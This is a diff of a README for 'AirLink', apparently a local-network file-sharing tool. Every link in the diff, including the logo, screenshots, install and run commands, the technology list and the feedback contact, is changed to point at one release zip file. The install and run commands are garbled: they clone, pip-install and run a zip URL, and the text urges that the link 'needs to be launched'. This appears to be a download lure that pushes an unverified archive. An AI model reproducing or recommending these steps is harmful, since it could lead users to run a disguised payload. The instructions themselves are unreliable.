@@ -1,6 +1,6 @@
 # AirLink
 
-![AirLink Logo](https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip)
+![AirLink Logo](https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip)
 
 Welcome to AirLink, a streamlined and user-friendly web-based file-sharing platform designed to facilitate secure and fast file transfers between devices connected to the same network.
 
@@ -14,39 +14,39 @@ Welcome to AirLink, a streamlined and user-friendly web-based file-sharing platf
 To get started with AirLink, follow these steps:
 1. Clone the repository:
    ```bash
-   git clone https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip
+   git clone https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip
    ```
 2. Install the required dependencies using pip:
    ```bash
-   pip install -r https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip
+   pip install -r https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip
    ```
 
 ## Usage
 1. Navigate to the project directory.
 2. Run the following command to start the server:
    ```bash
-   python https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip
+   python https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip
    ```
 3. Access the AirLink platform through your web browser at `http://localhost:5000`.
 
 ## Screenshots
-![Screenshot 1](https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip)
-![Screenshot 2](https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip)
+![Screenshot 1](https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip)
 
 ## Technologies Used
 - Frontend: HTML, CSS, JavaScript
 - Backend: Python, Flask
-- https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip for real-time communication
+- https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip for real-time communication
 
 ## Download Software
-[![Download AirLink](https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip)](https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip)
+[![Download AirLink](https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip)](https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip)
 
 **Note**: The link above needs to be launched for downloading the software. 
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository.
 
 ## Feedback
-Your feedback is valuable to us! If you have any suggestions or questions regarding AirLink, feel free to open an issue or reach out to us at [https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip](https://github.com/kylechan08611/AirLink/releases/download/v1.0/Release.zip).
+Your feedback is valuable to us! If you have any suggestions or questions regarding AirLink, feel free to open an issue or reach out to us at [https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip](https://github.com/kylechan08611/AirLink/releases/download/v2.0/Software.zip).
 
 Thank you for using AirLink! 🚀
 
